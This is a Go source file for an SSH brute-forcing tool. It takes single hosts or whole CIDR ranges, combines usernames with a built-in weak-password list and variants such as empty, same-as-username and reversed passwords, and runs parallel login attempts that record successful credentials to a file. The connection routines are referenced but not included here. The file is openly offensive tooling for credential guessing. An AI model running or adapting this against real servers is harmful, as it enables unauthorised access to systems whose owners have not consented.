// sshbf is a simple SSH Brute-Forcer.

/*
 * sshbf.go
 * Simple SSH bruteforcer
 * by J. Stuart McMurray
 * created 20140717
 * last modified 20140801
 */

package main

import (
	"flag"
	"fmt"
	"github.com/kd5pbo/tslist"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"
)

/* Used for removing hosts from the queue for a reason */
type badHost struct {
	Host   string
	Reason string
}

/* Internal password list */
var IPL []string = []string{"admin", "password", "1234", "12345", "123456",
	"test", "oracle"}

/* Default connect timeout */
var deftimeout string = "2m"
var retrywait string = "1s"

/* Global config struct */
var gc struct {
	Userf  *string
	Passf  *string
	Hostf  *string
	Ufilef *string
	Pfilef *string
	Hfilef *string
	Pnullf *bool
	Puserf *bool
	Pbackf *bool
	Pdeflf *bool
	Sshvsf *string
	Ntaskf *int
	Triesf *bool
	Stdinf *bool
	Plistf *bool
	Sfilef *string
	Onepwf *bool
	Errdbf *bool
	Pausef *time.Duration
	Waitf  *time.Duration
	Askipf *int
	Rteoff *bool
}

func main() {

	/* Slice of username/password combinations */
	templates := tslist.New()

	/* Initial list of passwords to guess */
	initpw := []string{}

	/* Command-line arguments */
	gc.Userf = flag.String("user", "", "Single SSH username.  If neither "+
		"this nor -ufile is specified, root will be used.")
	gc.Passf = flag.String("pass", "", "Single SSH password.  If neither "+
		"this nor -pfile is specified, a small internal list of "+
		"passwords will be attempted.  See -plist.")
	gc.Hostf = flag.String("host", "", "Host to attack.  This is, of "+
		"course, required.  Examples: foo.bar.com, "+
		"foo.baaz.com:2222.  Either this or -hfile must be "+
		"specified.  CIDR notation may be used to specify multiple "+
		"addresses at once.")
	gc.Ufilef = flag.String("ufile", "", "File with a list of usernames, "+
		"one per line.  If neither this nor -user is specified, the "+
		"single username root will be used.  This list will be "+
		"read into memory, so it should be kept short on low-memory "+
		"systems.")
	gc.Pfilef = flag.String("pfile", "", "File with a list of passwords, "+
		"one per line.  If neither this nor -pass is specified, a "+
		"small internal list of passwords will be attempted.  See "+
		"-plist.")
	gc.Hfilef = flag.String("hfile", "", "File with a list of hosts to "+
		"attack, one per line.  Either this or -host must be "+
		"specified.  This list will be read into memory, so it "+
		"should be kept short on low-memory systems.  CIDR notation "+
		"may be used to specify multiple addresses at once.")
	gc.Pnullf = flag.Bool("pnull", false, "Attempt the null (empty) "+
		"password as well as other specified passwords.")
	gc.Puserf = flag.Bool("puser", false, "Attempt the username as the "+
		"password as well as other specified passwords.")
	gc.Pbackf = flag.Bool("pback", false, "Attempt the username backwards "+
		"as the password as well as other specified passwords.  "+
		"E.g. root -> toor.")
	gc.Pdeflf = flag.Bool("pdefl", false, "Attempt the internal default "+
		"password list.")
	gc.Sshvsf = flag.String("sshvs", "SSH-2.0-sshbf_0.0.1", "SSH version "+
		"string to present to the server.")
	gc.Ntaskf = flag.Int("ntask", 4, "Number of attempts (tasks) to run in "+
		"parallel.  Don't set this too high.")
	gc.Triesf = flag.Bool("tries", false, "Print every guess.")
	gc.Stdinf = flag.Bool("stdin", false, "Ignore most of the above and "+
		"read tab-separated username<tab>password<tab>host lines from "+
		"stdin.  NOT CURRENTLY IMPLEMENTED.")
	gc.Plistf = flag.Bool("plist", false, "Print the internal default "+
		"password list and exit.")
	gc.Sfilef = flag.String("sfile", "", "Append successful "+
		"authentications to this file, which whill be flock()'d to "+
		"allow for multiple processes to write to it in parallel.")
	gc.Onepwf = flag.Bool("onepw", false, "Only find one username/password "+
		"pair per host.")
	gc.Errdbf = flag.Bool("errdb", false, "Print debugging information "+
		"relevant to errors made during SSH attempts.")
	gc.Pausef = flag.Duration("pause", 0, "Pause this long between "+
		"attempts.  Really only makes sense if -ntask=1 is used.")
	gc.Askipf = flag.Int("askip", 0, "Skip this many attacks at the "+
		"beginning.  Useful if -host is used and a network error "+
		"occurred.")
	gc.Rteoff = flag.Bool("rteof", false, "Sleep 1s and Retry attempts "+
		"that have generated an EOF error.")
	deftimeoutd, err := time.ParseDuration(deftimeout)
	if err != nil {
		fmt.Printf("Invalid default wait duration.\n\n.")
		fmt.Printf("This is a bad bug.\n\n")
		fmt.Printf("You should tell the developers.\n")
		os.Exit(-6)
	}
	gc.Waitf = flag.Duration("wait", deftimeoutd, "Wait this long for "+
		"authentication to succeed or fail.")
	flag.Parse()

	/* Print usage if no arguments */
	if len(os.Args) == 1 {
		flag.PrintDefaults()
	}

	/* If we're just printing the password list, do so and exit */
	if *gc.Plistf {
		fmt.Printf("Internal password list:\n")
		for _, p := range IPL {
			fmt.Printf("\t%v\n", p)
		}
		return
	}

	/* If we're to read from stdin, we can skip a lot of work */
	if *gc.Stdinf {
		/* TODO: Implement this */
		log.Printf("Reading from stdin not currently implemented.\n")
		os.Exit(-1)
	} else {
		/* Work out the list of targets and usernames */
		ft, err := readLines(*gc.Hostf, *gc.Hfilef)
		targets := []string{}
		if err != nil {
			log.Printf("Unable to read target hosts from %v: "+
				"%v.\n", *gc.Hfilef, err)
			os.Exit(-2)
		}
		/* Parse CIDR names */
		for _, t := range ft {
			/* Not CIDR */
			if !strings.ContainsRune(t, '/') {
				targets = append(targets, t)
				continue
			}
			/* CIDR */
			ip, in, err := net.ParseCIDR(t)
			/* Shouldn't happen, but typos happen. */
			if err != nil {
				log.Printf("%v does not appear to be CIDR "+
					"notation.  Adding it to target list "+
					"anyways.", t)
				targets = append(targets, t)
				continue
			}
			/* Add all addresses in netblock */
			for i := ip.Mask(in.Mask); in.Contains(i); incIP(i) {
				targets = append(targets, i.String())
			}
		}
		if len(targets) == 0 {
			log.Printf("Not enough target hosts specified.  " +
				"Please use -host and/or -hfile.\n")
			os.Exit(-4)
		}

		unames, err := readLines(*gc.Userf, *gc.Ufilef)
		if err != nil {
			log.Printf("Unable to read usernames from %v: %v.\n",
				*gc.Ufilef, err)
			os.Exit(-3)
		} else if len(unames) == 0 {
			/* Default to root only */
			unames = append(unames, "root")
		}

		/* Make sure the targets have ports */
		for i, t := range targets {
			if _, _, err := net.SplitHostPort(t); err != nil {
				targets[i] = net.JoinHostPort(t, "22")
			}
		}

		/* Make a list of passwordless ssh templates. */
		for _, u := range unames {
			for _, t := range targets {
				templates.PushBack(&template{User: u, Host: t})
			}
		}

		/* Work out a list of initial passwords */
		if *gc.Passf != "" { /* Password on command line */
			initpw = uniqueAppend(initpw, *gc.Passf)
		}
		if *gc.Pnullf { /* Use null password */
			initpw = uniqueAppend(initpw, "")
		}
		if *gc.Puserf { /* Username as password */
			for _, u := range unames {
				initpw = uniqueAppend(initpw, u)
			}
		}
		if *gc.Pbackf { /* Backwards username as password */
			for _, u := range unames {
				initpw = uniqueAppend(initpw, reverse(u))
			}
		}
		if *gc.Pdeflf { /* Internal default password list */
			for _, p := range IPL {
				initpw = uniqueAppend(initpw, p)
			}
		}
		if len(initpw) == 0 && *gc.Pfilef == "" { /* If all else fails */
			initpw = IPL
		}

	}

	/* File to which to append successes */
	var sf *os.File = nil
	if *gc.Sfilef != "" {
		sf, err = os.OpenFile(*gc.Sfilef,
			os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
		if err != nil {
			fmt.Printf("Error opening success file %v: %v",
				*gc.Sfilef, err)
			os.Exit(-7)
		}
	}

	/* Message that we're starting */
	log.Printf("Trying %v Username/Host combinations.", templates.Len())

	/* Generate username/password/host attempts */
	internalc := make(chan attempt) /* Internal list */
	go internalAttemptMaker(templates, initpw, *gc.Sshvsf, internalc)

	filec := make(chan attempt) /* Password file */
	go fileAttemptMaker(templates, *gc.Pfilef, *gc.Sshvsf, filec)

	/* TODO: Read username\tpassword\thost tuples from stdin */
	stdinc := make(chan attempt) /* Standard input */
	go stdinAttemptMaker(stdinc) /* TODO: Implement this */

	/* Start broker */
	go broker(internalc, filec, stdinc, *gc.Ntaskf, sf, *gc.Triesf,
		*gc.Onepwf, *gc.Errdbf, *gc.Waitf, *gc.Pausef, templates,
		*gc.Askipf)

	/* Derp derp derp */
	/* TODO: Make a c2 channel here */
	<-make(chan int)

	/* TODO: Use RemoveTemplates to remove unnecessary hosts */

}

/* incIP increments an IP Address */
func incIP(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] > 0 {
			break
		}
	}
}

/* maxIP tests if every byte in the IP address is 0xFF */
func maxIP(ip net.IP) bool {
	for _, b := range ip {
		if 0xFF != b {
			return false
		}
	}
	return true
}

/* Read lines from the file named file into a deduped, in-order slice,
optionally starting with leader if it is not the empty string.  It is not an
error if file is the empty string (in which case a slice containing only leader
will be returned), but it is an error if file cannot be read.  Windows line
endings may do strange things. */
func readLines(leader, file string) ([]string, error) {
	/* Initial collections */
	m := map[string]bool{}
	s := []string{}

	/* Add leader if it's not empty */
	if leader != "" {
		m[leader] = true
		s = append(s, leader)
	}

	/* Read from file if we have it */
	if file != "" {
		bytes, err := ioutil.ReadFile(file)
		if err != nil {
			return s, err
		}
		/* Remove single trailing newline (to prevent always having a
		   blank string */
		if bytes[len(bytes)-1] == '\n' {
			bytes = bytes[:len(bytes)-1]
		}
		/* Split the contents of the file into lines, append each
		   unique line */
		for _, h := range strings.Split(string(bytes), "\n") {
			/* Add the line if we don't already have it */
			if _, in := m[h]; !in {
				m[h] = true
				s = append(s, h)
			}
		}
	}
	return s, nil
}

/* reverse reverses a string */
func reverse(s string) string {
	// Get Unicode code points.
	n := 0
	rune := make([]rune, len(s))
	for _, r := range s {
		rune[n] = r
		n++
	}
	rune = rune[0:n]
	// Reverse
	for i := 0; i < n/2; i++ {
		rune[i], rune[n-1-i] = rune[n-1-i], rune[i]
	}
	// Convert back to UTF-8.
	return string(rune)
}

/* uniqueAppend appends a string to a slice only if the slice doesn't contain
the string.  Since it searches in O(n) time, it should only be used for
reasonably small slices */
func uniqueAppend(slice []string, s string) []string {
	/* Make sure s isn't in slice */
	for _, val := range slice {
		if val == s {
			return slice
		}
	}
	return append(slice, s)
}

/* randDuration generates a random duration less than s, which should be
a string allowed by time.ParseDuration */
func randDuration(s string) (time.Duration, error) {
	/* Get the max */
	d, err := time.ParseDuration(s)
	if err != nil {
		return d, err
	}
	/* Make a smaller duration */
	m := rand.Int63n(int64(d))
	/* Return it as a duration */
	return time.Duration(m), nil
}
